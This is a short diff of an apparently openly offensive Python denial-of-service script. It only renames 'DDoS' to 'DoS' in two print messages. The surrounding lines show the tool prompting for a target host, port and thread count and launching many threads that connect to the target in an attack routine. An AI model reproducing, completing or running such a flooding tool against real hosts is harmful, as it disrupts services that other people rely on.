@@ -4,7 +4,7 @@ import socket
 import time
 from threading import Thread
 
-print('DDoS v1.0\n')
+print('DoS v1.0\n')
 host = input('Host: ')
 port = int(input('Port: '))
 threads = int(input('Number of Threads: '))
@@ -20,7 +20,7 @@ def connect(i):
 	except:
 		print('Cannot connect to %s...' % host)
 def attack():
-	print('\nStarting DDoS attack...\n')
+	print('\nStarting DoS attack...\n')
 	for i in range(threads):
 		t = Thread(target=connect, args=(i,))
 		t.start()
